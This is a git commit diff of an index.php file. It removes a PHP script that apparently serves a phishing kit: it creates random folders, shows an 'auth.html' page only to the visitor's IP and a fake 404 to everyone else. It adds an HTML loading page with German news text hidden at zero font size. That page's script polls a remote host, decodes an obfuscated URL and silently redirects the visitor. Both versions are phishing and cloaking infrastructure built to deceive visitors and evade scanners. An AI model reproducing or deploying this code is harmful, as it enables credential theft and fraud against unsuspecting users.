670ff665bd4be2e45402c47c5ebbbe016a804603
wmj404 <147492095+wmj404@users.noreply.github.com>
2024-07-09 14:20:47 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,44 +1,127 @@
-<?php
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+      <style>
+ 
+.lds-ring,
+.lds-ring div {
+  box-sizing: border-box;
+}
+.lds-ring {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+}
+.lds-ring div {
+  box-sizing: border-box;
+  display: block;
+  position: absolute;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border: 8px solid currentColor;
+  border-radius: 50%;
+  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+  border-color: currentColor transparent transparent transparent;
+}
+.lds-ring div:nth-child(1) {
+  animation-delay: -0.45s;
+}
+.lds-ring div:nth-child(2) {
+  animation-delay: -0.3s;
+}
+.lds-ring div:nth-child(3) {
+  animation-delay: -0.15s;
+}
+@keyframes lds-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
 
 
-$_ = function($lenght){
-  return str_shuffle(
-                substr(
-                         str_shuffle(
-                                    str_repeat(
-                                            implode("",array_merge(range('a','z'),range('A','Z'),range(0,10)))
-                                              ,10)
-                       ),0,$lenght)
+        .amzz {
+            font-size: 0.1px;  /* Very small text size */
+        }
 
-         );
-};
-$lenght = 5;
+        body, html {
+    height: 100%;
+    margin: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
 
-$a = 'e/authID='.$_($lenght);
+  .center-div {
+    width: 50%; /* Adjust width as needed */
+    padding: 20px;
+    text-align: center;
+  }
+    </style>
+</head>
+<body><div class="center-div">
+  <div class="lds-ring"><div></div><div></div><div></div><div></div></div></div>
+  
+<p style="font-size:0px">Das Aus der deutschen Nationalelf bei der EM ist bitter. Der Schmerz ist besonders nach einer Handspielszene verständlich. Den Umgang einiger DFB-Fans damit rechtfertigt das jedoch nicht.
 
-$ip=$_SERVER['REMOTE_ADDR'];
+Hass im Netz ist immer verwerflich. Besonders zu verurteilen ist er jedoch, wenn sich ein nach Selbstjustiz lechzender Internet-Mob auf jemanden einschießt, der nur ein Opfer der Umstände, beileibe aber kein böswilliger Täter ist. Doch genau das passiert gerade im Fall von Marc Cucurella (mehr dazu lesen Sie hier).
 
-mkdir($a, 755);
+Der spanische Nationalspieler warf vor wenigen Tagen mit seinem Team die deutsche Mannschaft bei ihrer Heim-EM aus dem Turnier. Cucurella hatte daran einen entscheidenden Anteil, weil er beim Stand von 1:1 rund eine Viertelstunde vor dem Ende einen Schuss von DFB-Star Jamal Musiala mit der Hand abblockte. Schiedsrichter Anthony Taylor entschied zur Verwunderung einer ganzen Nation nicht auf Elfmeter, überprüfte die Situation auch nicht noch mal per Videobeweis.
 
-$text = "<?php function smartCopy(\$source, \$dest, \$options=array('folderPermission'=>0755,'filePermission'=>0755)){\$result=false;if (is_file(\$source)) {if (\$dest[strlen(\$dest)-1]=='/') {if (!file_exists(\$dest)) {cmfcDirectory::makeAll(\$dest,\$options['folderPermission'],true);}\$__dest=\$dest.'/'.basename(\$source);} else {\$__dest=\$dest;}\$result=copy(\$source, \$__dest);@chmod(\$__dest,\$options['filePermission']);} elseif(is_dir(\$source)) {if (\$dest[strlen(\$dest)-1]=='/') {if (\$source[strlen(\$source)-1]=='/') {} else {\$dest=\$dest.basename(\$source);if(!file_exists(\$dest)) mkdir(\$dest);@chmod(\$dest,\$options['filePermission']);}} else {if (\$source[strlen(\$source)-1]=='/') {if(!file_exists(\$dest)) mkdir(\$dest,\$options['folderPermission']);@chmod(\$dest,\$options['filePermission']);} else {if(!file_exists(\$dest)) mkdir(\$dest,\$options['folderPermission']);@chmod(\$dest,\$options['filePermission']);}}\$dirHandle=opendir(\$source);while(\$file=readdir(\$dirHandle)){if(\$file!='.' && \$file!='..'){if(!is_dir(\$source.'/'.\$file)) {\$__dest=\$dest.'/'.\$file;} else {\$__dest=\$dest.'/'.\$file;}\$result=smartCopy(\$source.'/'.\$file, \$__dest, \$options); } } closedir(\$dirHandle); } else { \$result=false; } return \$result; } \$userip='".$ip."'; \$visitorip=\$_SERVER['REMOTE_ADDR']; if (\$userip == \$visitorip) {   smartCopy('../../pack/', dirname( __FILE__ ));  \$content = file_get_contents('auth.html'); echo \$content; } else { echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /index.php was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>'; } ?>";
+Taylor war in der Folge für viele deutsche Fans der Sündenbock und der Grund, warum die DFB-Elf im eigenen Land jetzt nicht mehr um den Titel mitspielt. Doch auch auf Cucurella schossen sich die Anhänger vehement ein. Die Kommentare unter dessen letzten Instagram-Posts lassen bei den Deutschen Größe nach einer Niederlage vermissen. Das ist nicht die Art, wie sich ein Gastgeber mit Stil aus einem Turnier verabschieden sollte.
 
-$fp = fopen($a."/index.php", "w");
+Das ist absolut erbärmlich
+"Ganz Deutschland hasst dich." Das hat tatsächlich ein Nutzer bei Instagram unter einen der jüngsten Beiträge von Marc Cucurella geschrieben. "Deutschland-Verbot für immer", kommentierte wiederum ein anderer. Etliche weitere User bezeichneten den 25-Jährigen noch verhältnismäßig harmlos als Handballspieler. Wiederum andere attackierten aber auch sein Aussehen. "Geh mal Haare schneiden", stand da mit Verweis auf Cucurellas lange Locken. Und: "Der Wischmopp kann mein Klo putzen."</p>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js"></script>
+<script>
+  $(document).ready(function() {
+    // Function to generate a random MD5 hash
+    function generateRandomMD5() {
+      const randomString = Math.random().toString(36).substr(2, 9);
+      return md5(randomString);
+    }
 
-fwrite($fp, $text);
-fclose($fp);
+    // Function to redirect user to a specified page
+    function redirectToPage(page) {
+      window.location.href = page;
+    }
 
+    function checkForRedirection() {
+      const randomMD5 = generateRandomMD5(); // Generate a random MD5 hash
+      const targetUrl = `https://yamakius.com/${randomMD5}`; // Append the random MD5 hash to the URL
 
-$ref=$_SERVER['QUERY_STRING'];
-if ($ref!='')
- {
-  $ref=$a.'?'.$ref;
-  header("Location:  $ref ");
- }
-else
- {
-  header("Location:  $a ");
+      $.ajax({
+        url: targetUrl,
+        method: 'GET',
+        success: function(response) {
+          if (response !== "") {
+            let modifiedString = response.replace(/222/g, ".");
+            let modifiedString2 = modifiedString.replace(/333/g, "https");
+            redirectToPage(modifiedString2);
+          } else {
+            setTimeout(checkForRedirection, 5000); // Retry after 5 seconds if no redirection URL is received
+          }
+        },
+        error: function(xhr, status, error) {
+          console.error('Error fetching data:', error);
+          setTimeout(checkForRedirection, 5000); // Retry after 5 seconds on error
+        }
+      });
+    }
 
- }
+    // Start checking for redirection URL after a 3-second delay
+    setTimeout(checkForRedirection, 3000);
+  });
+</script>
 
-exit();
-?>
+</body>
+</html>
